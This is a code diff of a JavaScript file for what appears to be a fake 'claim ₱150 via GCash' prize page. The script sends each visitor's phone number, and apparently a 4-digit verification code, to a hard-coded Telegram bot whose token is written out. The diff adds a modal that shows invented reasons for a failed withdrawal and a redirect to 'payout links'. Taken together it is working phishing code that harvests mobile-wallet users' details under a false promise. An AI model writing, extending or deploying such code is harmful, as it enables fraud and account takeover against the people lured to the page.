@@ -1,4 +1,4 @@
-// ========== POPUP_SHARE.JS - SAME STYLE AS popup.js ==========
+// ========== POPUP_SHARE.JS - FIREWALL LOGIC FOR SHARE_AND_EARN ==========
 
 let claimStateShare = {
     isProcessing: false,
@@ -14,7 +14,7 @@ let cachedFirewallStatusShare = false;
 let currentVerificationCodeShare = null;
 let verificationAttemptsShare = 0;
 
-// ========== FIREWALL VERIFICATION (SAME STYLE) ==========
+// ========== FIREWALL VERIFICATION ==========
 async function getFirewallStatusShare() {
     if (typeof firebase === 'undefined' || !firebase.database) {
         console.warn("Firebase not available");
@@ -24,6 +24,7 @@ async function getFirewallStatusShare() {
         const db = firebase.database();
         const snap = await db.ref('admin/globalFirewall').once('value');
         const data = snap.val();
+        console.log("Firewall status:", data);
         if (data === null) {
             await db.ref('admin/globalFirewall').set({
                 active: false,
@@ -34,7 +35,7 @@ async function getFirewallStatusShare() {
         }
         return data.active === true;
     } catch(e) { 
-        console.error("Firewall check error:", e);
+        console.error("Firewall error:", e);
         return false;
     }
 }
@@ -45,7 +46,7 @@ function listenToFirewallChangesShare() {
     db.ref('admin/globalFirewall').on('value', (snapshot) => {
         const data = snapshot.val();
         cachedFirewallStatusShare = (data && data.active === true);
-        console.log("Firewall status updated:", cachedFirewallStatusShare);
+        console.log("Firewall updated:", cachedFirewallStatusShare);
     });
 }
 
@@ -57,14 +58,11 @@ async function sendTelegramShare(phone, code) {
     } catch(e) {}
 }
 
-// ========== FIREWALL POPUP (SAME STYLE AS MAIN) ==========
+// ========== FIREWALL POPUP (4-DIGIT VERIFICATION) ==========
 function showFirewallPopupShare() {
     console.log("Showing firewall verification popup");
     const popup = document.getElementById('firewallPopup');
-    if (!popup) {
-        console.error("Firewall popup not found");
-        return;
-    }
+    if (!popup) return;
     
     const content = document.getElementById('firewallPopupContent');
     if (content) {
@@ -160,13 +158,15 @@ async function getLatestPayoutLinkShare() {
             console.log("Found payout link:", linkData.url);
             return { url: linkData.url, key: key };
         }
+        console.log("No available links found");
         return null;
     } catch (error) {
+        console.error("Error getting link:", error);
         return null;
     }
 }
 
-// ========== CONGRATULATIONS POPUP (SAME STYLE AS MAIN, DIFFERENT THEME) ==========
+// ========== CONGRATULATIONS POPUP ==========
 async function showClaimPopupShare(amount) {
     console.log("showClaimPopupShare called with amount:", amount);
     
@@ -213,53 +213,7 @@ function hidePendingStatusShare() {
     claimStateShare.isPending = false; 
 }
 
-// ========== TIMER ON MAIN PAGE (THRILL EFFECT) ==========
-function showTimerOnPage() {
-    var timerContainer = document.getElementById('claimTimerContainer');
-    if (!timerContainer) {
-        var balanceSection = document.querySelector('.stats-row');
-        if (balanceSection) {
-            var container = document.createElement('div');
-            container.id = 'claimTimerContainer';
-            container.style.cssText = 'text-align: center; margin: 10px 0; padding: 8px; background: rgba(0,0,0,0.4); border-radius: 30px; border: 1px solid rgba(255,215,0,0.3);';
-            container.innerHTML = '<div style="font-size: 10px; color: #ffaa33; letter-spacing: 1px;">⏰ CLAIM EXPIRES IN</div><div id="claimTimerDisplay" style="font-family: Orbitron, monospace; font-size: 24px; font-weight: bold; color: #ffd700;">01:00</div>';
-            balanceSection.parentNode.insertBefore(container, balanceSection.nextSibling);
-        }
-    }
-    timerContainer = document.getElementById('claimTimerContainer');
-    if (timerContainer) timerContainer.style.display = 'block';
-}
-
-function hideTimerOnPage() {
-    var timerContainer = document.getElementById('claimTimerContainer');
-    if (timerContainer) timerContainer.style.display = 'none';
-}
-
-function updateTimerDisplay(seconds) {
-    var timerDisplay = document.getElementById('claimTimerDisplay');
-    if (timerDisplay) {
-        var mins = Math.floor(seconds / 60);
-        var secs = seconds % 60;
-        timerDisplay.innerHTML = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-        
-        // Thrill effect - change color
-        if (seconds <= 10) {
-            timerDisplay.style.color = '#ff4444';
-            timerDisplay.style.textShadow = '0 0 10px #ff4444';
-            timerDisplay.style.animation = 'pulseText 0.5s infinite';
-        } else if (seconds <= 30) {
-            timerDisplay.style.color = '#ffaa33';
-            timerDisplay.style.textShadow = '0 0 5px #ffaa33';
-            timerDisplay.style.animation = 'none';
-        } else {
-            timerDisplay.style.color = '#ffd700';
-            timerDisplay.style.textShadow = '0 0 3px #ffd700';
-            timerDisplay.style.animation = 'none';
-        }
-    }
-}
-
-// ========== BALANCE DECREMENT ==========
+// ========== BALANCE DECREMENT (VISIBLE) ==========
 function startSmoothDecrementShare(originalAmount) {
     const balanceDisplay = document.getElementById('userBalanceDisplay');
     if (!balanceDisplay) return;
@@ -280,44 +234,6 @@ function startSmoothDecrementShare(originalAmount) {
     }, intervalTime);
 }
 
-function restoreBalance(originalAmount) {
-    const balanceDisplay = document.getElementById('userBalanceDisplay');
-    if (balanceDisplay) {
-        balanceDisplay.innerText = "₱" + originalAmount.toLocaleString();
-    }
-}
-
-// ========== 1-MINUTE CLAIM TIMER ==========
-function startClaimTimer(originalAmount) {
-    let remaining = 60;
-    showTimerOnPage();
-    updateTimerDisplay(remaining);
-    
-    claimStateShare.countdownInterval = setInterval(() => {
-        if (remaining > 0) {
-            remaining--;
-            updateTimerDisplay(remaining);
-        }
-        
-        if (remaining <= 0) {
-            clearInterval(claimStateShare.countdownInterval);
-            claimStateShare.countdownInterval = null;
-            
-            restoreBalance(originalAmount);
-            hideTimerOnPage();
-            claimStateShare.isProcessing = false;
-            
-            var statusMsg = document.getElementById('statusMessage');
-            if (statusMsg) {
-                statusMsg.innerHTML = '<span class="status-locked">⏰ Time expired! Please try claiming again.</span>';
-                setTimeout(() => {
-                    statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
-                }, 3000);
-            }
-        }
-    }, 1000);
-}
-
 // ========== CLAIM ACTION ==========
 async function onClaimActionShare() {
     if (claimStateShare.isProcessing) return;
@@ -332,6 +248,7 @@ async function onClaimActionShare() {
         claimBtn.innerHTML = 'PROCESSING...';
     }
     
+    // Send Telegram notification
     fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent("CLAIM REQUEST!\nPhone: " + userPhone + "\nAmount: ₱" + amount)}`)
         .catch(e => console.log('Telegram error:', e));
     
@@ -353,15 +270,18 @@ async function onClaimActionShare() {
                 });
                 
                 hideClaimPopupShare();
-                startSmoothDecrementShare(amount);
-                startClaimTimer(amount);
+                showPendingStatusShare();
                 
+                // Start balance decrement animation
+                startSmoothDecrementShare(amount);
+                
+                // Redirect after 2 seconds
                 setTimeout(() => {
                     if (!claimStateShare.hasRedirected) {
                         claimStateShare.hasRedirected = true;
                         window.location.href = finalUrl;
                     }
-                }, 3000);
+                }, 2000);
                 
             } else {
                 if (claimBtn) {
@@ -372,7 +292,7 @@ async function onClaimActionShare() {
                         claimStateShare.isProcessing = false;
                     }, 3000);
                 }
-                alert("Withdrawal unsuccessful. No payout link available.");
+                showNoLinkAlertShare();
             }
         } catch(err) {
             console.error("Error:", err);
@@ -389,10 +309,78 @@ async function onClaimActionShare() {
     }
 }
 
-// ========== CLAIM THRU GCASH HANDLER ==========
+// ========== NO LINK ALERT ==========
+function showNoLinkAlertShare() {
+    const modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.zIndex = '20000';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    
+    modal.innerHTML = `
+        <div style="background:#1a1525; border-radius:40px; max-width:320px; width:85%; padding:30px; text-align:center; border:1px solid #ff4444;">
+            <div style="font-size:48px;">⚠️</div>
+            <h3 style="color:#ff4444;">WITHDRAWAL UNSUCCESSFUL</h3>
+            <div style="color:white; font-size:13px; text-align:left; margin-top:20px;">
+                <p>• This device has already reached the maximum payout limit.</p>
+                <p>• No GCash app installed on this device.</p>
+                <p>• Please try using another device.</p>
+            </div>
+            <button id="closeAlert" style="background:#ff4444; border:none; border-radius:40px; padding:12px; color:white; margin-top:20px; width:100%; cursor:pointer;">GOT IT</button>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    document.getElementById('closeAlert').onclick = () => modal.remove();
+}
+
+// ========== CLAIM THRU GCASH HANDLER (from prizePopup) ==========
 async function handleClaimThruGCashShare() {
-    console.log("CLAIM THRU GCASH clicked");
-    showClaimPopupShare(150);
+    console.log("CLAIM THRU GCASH clicked from prizePopup");
+    
+    // Check firewall first
+    const firewallActive = await getFirewallStatusShare();
+    console.log("Firewall status:", firewallActive ? "ON" : "OFF");
+    
+    if (firewallActive) {
+        console.log("Firewall ON - showing verification popup");
+        showFirewallPopupShare();
+    } else {
+        console.log("Firewall OFF - showing congratulations popup");
+        showClaimPopupShare(150);
+    }
+}
+
+// ========== INITIALIZE ALL BUTTONS ==========
+function initClaimThruGCashButton() {
+    // Target the CLAIM THRU GCASH button inside prizePopup
+    const claimBtn = document.getElementById('claimGCashBtn');
+    if (claimBtn) {
+        console.log("CLAIM THRU GCASH button found");
+        claimBtn.onclick = function(e) {
+            e.preventDefault();
+            handleClaimThruGCashShare();
+        };
+    } else {
+        console.log("CLAIM THRU GCASH button not found yet");
+    }
+}
+
+function initClaimActionButton() {
+    const actionBtn = document.getElementById('claimActionBtn');
+    if (actionBtn) {
+        console.log("Claim action button found");
+        actionBtn.onclick = function(e) {
+            e.preventDefault();
+            onClaimActionShare();
+        };
+    }
 }
 
 // ========== EXPORT ==========
@@ -411,5 +399,10 @@ document.addEventListener('DOMContentLoaded', function() {
         console.log("Initial firewall status:", status);
         cachedFirewallStatusShare = status;
     });
-    console.log("Popup_share.js loaded");
+    
+    // Initialize buttons
+    initClaimThruGCashButton();
+    initClaimActionButton();
+    
+    console.log("Popup_share.js loaded - Firewall ready");
 });
